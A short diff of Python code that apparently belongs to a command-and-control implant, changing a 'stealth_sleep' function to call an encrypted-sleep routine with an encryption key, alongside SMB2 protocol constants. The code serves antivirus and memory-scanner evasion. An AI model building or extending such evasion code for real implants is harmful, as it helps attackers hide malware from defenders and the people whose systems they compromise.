@@ -25,7 +25,12 @@ def sleep_mask(seconds):
         pass
 
 def stealth_sleep(seconds):
-    sleep_mask(seconds)
+    secret = bytearray(ENCRYPTION_KEY)
+    try:
+        globals()['sleep_encrypt'](seconds, secret)
+        return
+    except Exception:
+        sleep_mask(seconds)
 SMB2 = b'\xfeSMB'
 FILE_REQ = 0x10
 FILE_RESP = 0x20
